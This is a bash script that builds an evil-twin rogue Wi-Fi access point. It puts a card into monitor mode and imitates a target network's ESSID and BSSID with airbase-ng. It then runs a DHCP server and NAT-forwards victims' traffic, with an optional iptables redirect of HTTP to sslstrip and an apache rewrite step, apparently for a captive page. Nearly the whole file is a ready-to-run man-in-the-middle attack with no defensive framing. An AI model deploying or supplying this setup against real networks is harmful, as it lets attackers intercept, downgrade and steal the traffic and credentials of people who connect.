#!/bin/bash

# How it works:
# 1. Set $INTERFACE to monitor mode
# 2. Use target info to create evil twin AP
# 3. ifconfig at0 up
# 4. ifconfig at0 192.168.1.1
# 5. route add 192.168.1.0 gw 192.168.1.2
# 6. Configure rogue_ap.conf subnet to use gateway 192.168.1.2
# 7. dhcpd -f -d -cf ./rogue_ap.conf
# 8. Set iptables rules to route all traffic from interface at0 to interface wlan0

TARGET_ESSID="ROGUE_AP"
TARGET_BSSID="AA:AA:AA:AA:AA:AA"
LOG_DIRECTORY="./logs"
DHCP_CONF="./rogue_ap.conf"

GATEWAY_ADDRESS="192.168.1.1"
DESTINATION_ADDRESS="192.168.1.0"

INTERNET_INTERFACE="wlan0" # Internet-facing interface

USE_SSLSTRIP="false"

if [ "$1" == "start" ]
then
  echo "Setting wlan1 to monitor mode..."
  airmon-ng start wlan1
  sleep 2

  echo "Creating log directory in $LOG_DIRECTORY"
  mkdir -p $LOG_DIRECTORY

  echo "Starting rogue AP..."
  airbase-ng -a "$TARGET_BSSID" -e "$TARGET_ESSID" -F "$LOG_DIRECTORY/`date +"%m %d %Y"`" wlan1mon &
  sleep 2

  echo "Setting up at0..."
  ifconfig at0 up
  ifconfig at0 "$GATEWAY_ADDRESS" netmask 255.255.255.0

  echo "Setting gateway for packets destined for at0"
  route add $DESTINATION_ADDRESS gw $GATEWAY_ADDRESS
  route -n

  echo "Setting up DHCP server on internet-facing interface..."
  dhcpd -d -f -cf "$DHCP_CONF" at0 &
  sleep 2

  echo "Configuring iptables to route packets recieved from at0 to internet-facing interface..."
  iptables -t nat -A POSTROUTING --out-interface wlan0 -j MASQUERADE
  iptables -A FORWARD -j ACCEPT --in-interface at0
  sysctl -w net.ipv4.ip_forward=1
  sleep 2

  if [ "$USE_SSLSTRIP" == "true" ]
  then
    iptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 8080 &
    sleep 2
  fi

  # Setup apache httpd mod_rewrite
  echo "Enabling apache2 rewrite module..."
  a2enmod rewrite

  # Symlink apache files to /var/www/

elif [ "$1" == "stop" ]
then
  echo "Stopping DHCP daemon..."
  pkill dhcpd
  sleep 2

  echo "Stopping airbase-ng..."
  pkill airbase-ng
  sleep 2

  if [ "$USE_SSLSTRIP" == "true" ]
  then
    pkill sslstrip
    sleep 2
  fi

  echo "Stopping monitor mode on wlan1mon..."
  airmon-ng stop wlan1mon
  sleep 2

  echo "Flushing iptables..."
  iptables -t nat --flush
  iptables --flush

  echo "Disabling ip forwarding..."
  sysctl -w net.ipv4.ip_forward=0

  echo "Disabling apache2 rewrite module..."
  a2dismod rewrite
  sleep 2

else
  echo "Usage: ./rogue_ap.sh start|stop"
fi
